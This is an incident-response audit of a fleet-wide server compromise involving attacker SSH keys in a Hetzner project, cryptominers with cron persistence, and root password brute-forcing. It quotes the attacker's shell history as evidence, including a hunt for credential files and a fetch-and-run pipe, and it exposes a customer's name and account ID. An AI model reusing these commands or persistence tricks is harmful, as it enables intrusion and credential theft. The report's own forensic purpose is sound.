# ACTIVE compromise, fleet-wide — the 2026-08-15 containment covered one box of four

Date: 2026-08-16 (UTC). Supersedes the containment claim in Club Arena `0eec5922c`.

The 2026-08-15 incident record says the root compromise was contained. It was
not. **XMRig was still mining on two other Hetzner servers when this audit ran**,
the attacker's SSH keys were sitting in the **Hetzner project key store** (so
they get re-installed on any server built from the console), and the entry vector
— SSH password authentication with root login — was still open and being brute-
forced at a rate of ~200,000 attempts per box.

All of that is now closed. One box remains unreachable and needs a decision.

---

## What was actually true

| | 2026-08-15 record | Reality on 2026-08-16 |
|---|---|---|
| Scope | 1 host (`178.156.160.206`) | ≥3 hosts, likely 4 |
| Attacker keys | "removed the 4 attacker SSH keys" | removed from *one box's* `authorized_keys`; **all 5 still in the Hetzner project** |
| Miner | "containment performed" | **running on 2 hosts at audit time** |
| Entry vector | asserted | **confirmed**: root + password auth, still enabled |

## The key that started this

The `hetzner-access` key found on the production engine host is stored in the
Hetzner project as **`kilo-access`**, created `2026-07-18T15:48:12Z` — twelve
minutes before it appeared in `authorized_keys` on that box and was used from
`169.150.201.23`. Resolving it required listing the project's keys and computing
SHA256 fingerprints from the public key material, since Hetzner's API returns
MD5.

Every one of the four attacker key comments in `0eec5922c` maps to a key that was
still live in the project, plus a fifth that the incident missed:

| Hetzner name | SHA256 fingerprint | key comment | created |
|---|---|---|---|
| `sanya-key` | `po9SzNdFeZY77d5wLNkx80bjjyF+bn2wveAS2j60zek` | *(none)* | 2026-05-09 |
| `ovh-vps-key` | `GroDkerA7920NWS+AkQgoERosiVxJ7V3M1pKsr5ck98` | `ovh-vps` | 2026-05-23 |
| `hezner-1` | `/Hd8tEqYat8hB19ARYtUxz2XL3BgO35KRkK7tVqxLow` | `hezner-1` | 2026-06-07 |
| `aws-1` | `XTPAf6FzVE10CeymTBCzMNZAsZD+//FJDUVVfOzWluo` | `aws-1` | 2026-06-14 |
| `kilo-access` | `hriJ9Xg6ijF5HUYfadqI766DaeFj/m5Wb/oCLhzcJZ0` | `hetzner-access` | 2026-07-18 |

`hezner-1` (note the misspelling) was never flagged. None match any of the six
keys on Dan's Mac.

**This is the finding that matters most.** Cleaning `authorized_keys` on a host
is cosmetic while these sit in the project: Hetzner injects project keys into
every new server at build time. That is precisely how a box described as a clean
rebuild came up with a backdoor already installed. The earliest of them dates to
**2026-05-09**, so the intrusion is at least three months old, not one day.

## Entry vector — confirmed, not inferred

Both reachable workers had `PasswordAuthentication yes`. Retained logs:

```
178.104.180.220  Failed password  210,475
5.161.49.206     Failed password  162,398
```

Continuous root brute-force from `40.117.97.0`, `45.142.193.164`, `185.74.59.5`
and others. `/root/.bash_history` on `5.161.49.206` records the intrusion in the
operator's own words, comments in Russian:

```
find /home/openclaw -name ".env" 2>/dev/null      <- credential hunting
cat /opt/smarter-poker/yt-transcode-worker/refresh-yt-cookies.py | head -30
wget -qO - bench.sh | bash
mkdir -p /root/.system
# Создаём/редактируем скрипт        ("create/edit the script")
nano /root/.system/install_bench.sh
# Делаем исполняемым                ("make it executable")
chmod +x /root/.system/install_bench.sh
# Запускаем                         ("run it")
```

The `.env` hunt is the part with real consequences: this is the same operator who
read the engine host's environment file, which is why every credential that file
held must be treated as disclosed.

## The miner

Identical binary on both hosts — `sha256 b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49`,
installed at `/root/.system-cache/systemd-bench`, masquerading as a systemd
utility.

```
pool  pool.supportxmr.com:443
user  4ABn…                       (Monero wallet, redacted)
pass  work333_3_her   (178.104.180.220)
      work333_4_ker   (5.161.49.206)
```

Sequential worker names `work333_3` and `work333_4` imply at least four hosts in
this operator's fleet — consistent with the engine box and openclaw-dispatcher
being `_1` and `_2`.

- `178.104.180.220`: running since **2026-07-18 15:57:01**, persisted via root
  crontab `@reboot sleep 90 && /etc/xmrig-restore/restore.sh` plus
  `*/30 * * * *`. Installer dated 2026-05-24.
- `5.161.49.206`: running since **2026-08-15 21:10:48** — i.e. it came back
  *after* the containment that day. No cron persistence on this host.

## Actions taken (all times UTC, 2026-08-16)

1. **02:33 — deleted all 5 attacker keys from the Hetzner project.** Public keys
   preserved first to `~/Documents/incident-2026-08-16/hetzner-project-ssh-keys-BEFORE-deletion.json`.
   Project now holds exactly 4 keys, all Dan's: `deploy-key`,
   `openclaw-deploy-key`, `workers-deploy-key`, `pnrx-sandbox-deploy`.
2. **Evidence preserved on-host** to `/root/.incident-2026-08-16/` on both
   workers: crontab, full miner directory, installer, original `authorized_keys`,
   binary hash, process table.
3. **Killed both miners.** Cron persistence removed *before* the kill — the
   `*/30` job would otherwise have reinstalled within the half hour. Payloads
   moved to quarantine (`chmod 000`), not deleted, so forensics survive.
4. **Stripped attacker keys** from `authorized_keys`: 2 removed on
   `178.104.180.220`; `5.161.252.33` cleaned of `hetzner-access` (backup at
   `/root/.ssh/authorized_keys.bak.20260816T013730Z`).
5. **Closed the entry vector** on both workers via
   `/etc/ssh/sshd_config.d/99-incident-hardening.conf`: `PasswordAuthentication
   no`, `KbdInteractiveAuthentication no`, `PermitRootLogin prohibit-password`.
   Config tested with `sshd -t` before reload; key auth re-verified afterwards on
   both hosts so nobody is locked out.
6. **Verified production unaffected** — `engine.smarter.poker` HTTP 200 from
   `5.161.252.33` throughout.

## Account recovery — the blocker is solved

Dan did not have the Hetzner login details. From the invoice at
`~/Downloads/Hetzner_2026-05-01_080000869173.pdf`:

```
Customer ID : K0397552326
Account     : Smarter.Poker  /  Mr. Daniel Bekavac
Project     : "Smarter-Poker"
Billing     : credit card on file, ~$67/mo
```

That Customer ID is enough to recover access at `accounts.hetzner.com` or via
Hetzner support (`info@hetzner.com`, +49 9831 505-0).

## Open — needs Dan

1. **Rotate the Hetzner API token.** It lived in the `.env` the attacker read.
   It is still valid, and it is the single credential that can delete every
   server in the project. Console-only operation. **Highest priority.**
2. **`openclaw-dispatcher` (178.104.160.250) — locked out.** SSH is open, but the
   host key has changed from what's in `known_hosts` and none of Dan's six keys
   authenticate. Almost certainly attacker-controlled, and almost certainly
   miner `work333_1` or `_2`. Recommended: **Hetzner rescue mode** — reboots into
   a rescue OS with a key we control, disk intact, so the box can be inspected
   and its `authorized_keys` repaired without data loss. Costs a few minutes of
   openclaw cron downtime. A full rebuild also works and is now safe, since the
   attacker keys are out of the project — but it wipes the box.
3. **`178.156.160.206` is not in this Hetzner project.** Only 4 servers exist and
   the old engine box is not among them, yet it still answers HTTP. Either a
   second project/account holds it, or the IP was released and re-assigned. It is
   out of DNS as of 01:30:50Z. Unresolved.
4. **No firewalls exist in the project at all** (`/v1/firewalls` returns 0). Every
   host has SSH exposed to the internet. Given ~370k brute-force attempts across
   two boxes, a firewall restricting port 22 to Dan's IP and GitHub Actions
   ranges is the obvious next hardening step.
5. **Still unrotated** from the original incident: Supabase Postgres superuser
   password, PokerAtlas, Bravo admin + API token, `CRON_SECRET`.

## Method note

No credential value was printed at any point in this work. The Hetzner API token
was piped from the macOS keychain directly into a `curl` Authorization header and
unset immediately; the Vercel session was used in place via `env -u VERCEL_TOKEN`.
Everything above was established from API responses, log files, and public keys.
